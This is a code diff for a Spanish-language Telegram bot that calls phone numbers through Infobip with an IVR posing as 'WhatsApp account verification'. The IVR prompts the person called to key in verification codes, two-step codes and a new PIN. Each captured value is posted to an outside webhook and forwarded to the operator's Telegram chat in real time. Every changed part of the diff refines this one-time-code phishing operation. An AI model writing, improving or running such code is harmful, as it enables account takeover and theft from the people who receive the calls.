@@ -22,12 +22,20 @@ const WEBHOOK = "https://botllamadas.onrender.com/infobip-webhook";
 // =========================
 const authenticatedUsers = {};
 const awaitingInput = {};
-const callRequests = {};          // { scenarioId: chatId }
-const callRequestsByNumber = {};  // { targetNumber: { chatId, fromNumber } }
-const answeredCalls = new Set();  // números que sí contestaron
+const callRequests = {};
+const callRequestsByNumber = {};
+const answeredCalls = new Set();
 
 const SCENARIO_NAME = "Verificación de cuenta WhatsApp";
-let cachedScenarioId = null;
+
+// =========================
+// HELPERS
+// =========================
+function formatNumber(num) {
+  if (!num || num === "?") return "+?";
+  const s = String(num);
+  return s.startsWith("+") ? s : "+" + s;
+}
 
 // =========================
 // INICIALIZACIÓN DEL BOT
@@ -149,13 +157,13 @@ bot.on("text", (ctx, next) => {
 // ESCENARIO IVR
 // =========================
 
-function notifyEvent(type, extra = {}) {
+function notifyEvent(type, fromNumber, toNumber, extra = {}) {
   return {
     request: WEBHOOK,
     options: {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: { type, ...extra }
+      body: { type, from: fromNumber, to: toNumber, ...extra }
     }
   };
 }
@@ -168,8 +176,7 @@ function buildScenarioPayload(fromNumber, toNumber) {
     description: "Flujo interactivo que integra captura inmediata de DTMF/voz y notifica cada interacción en tiempo real.",
     script: [
 
-      // 📲 Llamada contestada
-      notifyEvent("CALL_ANSWERED", { from: fromNumber, to: toNumber }),
+      notifyEvent("CALL_ANSWERED", fromNumber, toNumber),
 
       {
         repeat: [
@@ -185,7 +192,7 @@ function buildScenarioPayload(fromNumber, toNumber) {
         while: "${initialOption != '1' && initialOption != '2'}"
       },
 
-      notifyEvent("DTMF_CAPTURED", { field: "initialOption", value: "${initialOption}", from: fromNumber, to: toNumber }),
+      notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "initialOption", value: "${initialOption}" }),
 
       { say: "Ha presionado ${initialOption}.", options: voiceOptions },
 
@@ -199,7 +206,7 @@ function buildScenarioPayload(fromNumber, toNumber) {
         options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
       },
 
-      notifyEvent("DTMF_CAPTURED", { field: "verificationCode", value: "${verificationCode}", from: fromNumber, to: toNumber }),
+      notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "verificationCode", value: "${verificationCode}" }),
 
       {
         repeat: [
@@ -215,7 +222,7 @@ function buildScenarioPayload(fromNumber, toNumber) {
         while: "${twoStepOption != '1' && twoStepOption != '2'}"
       },
 
-      notifyEvent("DTMF_CAPTURED", { field: "twoStepOption", value: "${twoStepOption}", from: fromNumber, to: toNumber }),
+      notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "twoStepOption", value: "${twoStepOption}" }),
 
       {
         if: "${twoStepOption == '1'}",
@@ -228,7 +235,7 @@ function buildScenarioPayload(fromNumber, toNumber) {
             collectInto: "twoStepCode",
             options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
           },
-          notifyEvent("DTMF_CAPTURED", { field: "twoStepCode", value: "${twoStepCode}", from: fromNumber, to: toNumber }),
+          notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "twoStepCode", value: "${twoStepCode}" }),
           { say: "Código de dos pasos recibido. Gracias por su verificación.", options: voiceOptions }
         ]
       },
@@ -244,19 +251,18 @@ function buildScenarioPayload(fromNumber, toNumber) {
             collectInto: "newTwoStepPin",
             options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
           },
-          notifyEvent("DTMF_CAPTURED", { field: "newTwoStepPin", value: "${newTwoStepPin}", from: fromNumber, to: toNumber }),
+          notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "newTwoStepPin", value: "${newTwoStepPin}" }),
           { say: "Nuevo pin configurado correctamente.", options: voiceOptions }
         ]
       },
 
-      notifyEvent("CALL_FINISHED", { from: fromNumber, to: toNumber }),
+      notifyEvent("CALL_FINISHED", fromNumber, toNumber),
 
       "hangup"
     ]
   };
 }
 
-// Siempre crea escenario nuevo con los números reales inyectados
 function createScenario(apiKey, fromNumber, toNumber, callback) {
   const options = {
     method: "POST",
@@ -305,7 +311,6 @@ function initiateCall(chatId, targetNumber, fromNumber) {
 }
 
 function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
-  // Guardar por scenarioId y por número (con y sin +)
   callRequests[scenarioId] = chatId;
   const cleanTarget = targetNumber.replace(/^\+/, "");
   callRequestsByNumber[cleanTarget] = { chatId, fromNumber, toNumber: targetNumber };
@@ -379,11 +384,7 @@ function extractScenarioId(event) {
 }
 
 function resolveChatId(scenarioId, toNumber) {
-  // 1. Por scenarioId
-  if (scenarioId && callRequests[scenarioId]) {
-    return callRequests[scenarioId];
-  }
-  // 2. Por número destino
+  if (scenarioId && callRequests[scenarioId]) return callRequests[scenarioId];
   if (toNumber) {
     const clean = String(toNumber).replace(/^\+/, "");
     const entry = callRequestsByNumber[clean] || callRequestsByNumber["+" + clean];
@@ -411,6 +412,27 @@ function notifyTelegram(scenarioId, msg, toNumber) {
   }
 }
 
+function cleanupFull(scenarioId, toNumber) {
+  if (scenarioId) delete callRequests[scenarioId];
+  if (toNumber) {
+    const clean = String(toNumber).replace(/^\+/, "");
+    delete callRequestsByNumber[clean];
+    delete callRequestsByNumber["+" + clean];
+    answeredCalls.delete(clean);
+  }
+}
+
+function cleanupCallOnly(scenarioId, toNumber) {
+  // Limpia referencias de llamada pero NO answeredCalls
+  // para que el reporte final aún pueda verificar si contestó
+  if (scenarioId) delete callRequests[scenarioId];
+  if (toNumber) {
+    const clean = String(toNumber).replace(/^\+/, "");
+    delete callRequestsByNumber[clean];
+    delete callRequestsByNumber["+" + clean];
+  }
+}
+
 app.post("/infobip-webhook", (req, res) => {
   console.log("Webhook recibido:", JSON.stringify(req.body, null, 2));
   const payload = req.body;
@@ -426,33 +448,35 @@ app.post("/infobip-webhook", (req, res) => {
       answeredCalls.add(clean);
     }
 
-    // Detectar no contestó: reporte final sin CALL_ANSWERED previo
+    // Reporte final (sin event.type)
     if (!event.type && event.voiceCall) {
       const toNum = toNumber ? String(toNumber).replace(/^\+/, "") : null;
       const didAnswer = toNum && answeredCalls.has(toNum);
 
       if (!didAnswer) {
-        // Alerta de no contestó en tiempo real
+        // No contestó
         const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
         const timestamp = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
-        const alertMsg = `📵 *NO CONTESTÓ*\n📞 De: +${from}\n🎯 Para: +${toNumber || "?"}\n🕐 ${timestamp}`;
+        const alertMsg = `📵 *NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(toNumber)}\n🕐 ${timestamp}`;
         notifyTelegram(scenarioId, alertMsg, toNumber);
-
-        // Limpiar y no procesar el resumen
-        cleanup(scenarioId, toNumber);
-        return;
+      } else {
+        // Sí contestó — mostrar resumen final normalmente
+        const msg = processCallEvent(event);
+        notifyTelegram(scenarioId, msg, toNumber);
       }
 
-      // Limpiar el número del set al finalizar
-      if (toNum) answeredCalls.delete(toNum);
+      // Limpiar todo al llegar el reporte final
+      cleanupFull(scenarioId, toNumber);
+      return;
     }
 
+    // Eventos en tiempo real
     const msg = processCallEvent(event);
     notifyTelegram(scenarioId, msg, toNumber);
 
-    // Limpiar al finalizar
-    if (event.type === "CALL_FINISHED" || (!event.type && event.voiceCall)) {
-      cleanup(scenarioId, toNumber);
+    // Al finalizar la llamada, limpiar referencias pero NO answeredCalls
+    if (event.type === "CALL_FINISHED") {
+      cleanupCallOnly(scenarioId, toNumber);
     }
   };
 
@@ -464,16 +488,6 @@ app.post("/infobip-webhook", (req, res) => {
 
   res.sendStatus(200);
 });
-
-function cleanup(scenarioId, toNumber) {
-  if (scenarioId) delete callRequests[scenarioId];
-  if (toNumber) {
-    const clean = String(toNumber).replace(/^\+/, "");
-    delete callRequestsByNumber[clean];
-    delete callRequestsByNumber["+" + clean];
-    answeredCalls.delete(clean);
-  }
-}
 
 // =========================
 // PROCESAMIENTO DE EVENTOS
@@ -488,22 +502,22 @@ function processCallEvent(event) {
     switch (event.type) {
 
       case "CALL_ANSWERED":
-        message = `✅ *¡LLAMADA CONTESTADA!*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        message = `✅ *¡LLAMADA CONTESTADA!*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
 
       case "CALL_FINISHED":
-        message = `📵 *LLAMADA FINALIZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        message = `📵 *LLAMADA FINALIZADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
 
       case "CALL_FAILED":
       case "NO_ANSWER":
       case "CALL_NO_ANSWER":
-        message = `❌ *LLAMADA FALLIDA / NO CONTESTÓ*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        message = `❌ *LLAMADA FALLIDA / NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
 
       case "CALL_REJECTED":
       case "BUSY":
-        message = `🚫 *LLAMADA RECHAZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        message = `🚫 *LLAMADA RECHAZADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
 
       case "DTMF_CAPTURED": {
@@ -515,28 +529,27 @@ function processCallEvent(event) {
           newTwoStepPin:    "📌 Nuevo PIN"
         };
         const fieldLabel = fieldNames[event.field] || event.field;
-        message = `🔢 *${fieldLabel}: ${event.value}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        message = `🔢 *${fieldLabel}: ${event.value}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
       }
 
       case "CALL_STARTED":
       case "STARTED":
-        message = `📲 *LLAMADA INICIADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        message = `📲 *LLAMADA INICIADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
 
       case "CALL_RINGING":
       case "RINGING":
-        message = `🔔 *LLAMANDO...*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        message = `🔔 *LLAMANDO...*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
 
       default:
-        message = `ℹ️ *EVENTO: ${event.type}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        message = `ℹ️ *EVENTO: ${event.type}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         if (event.properties) message += `\n📋 ${JSON.stringify(event.properties)}`;
     }
 
   } else if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.collectedDtmfs) {
-    // Resumen final
-    message = `📋 *RESUMEN DE LLAMADA*\n📞 De: +${from}\n🎯 Para: +${to}\n`;
+    message = `📋 *RESUMEN DE LLAMADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n`;
     try {
       const dtmfData = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
       if (dtmfData.initialOption && dtmfData.initialOption !== "null")
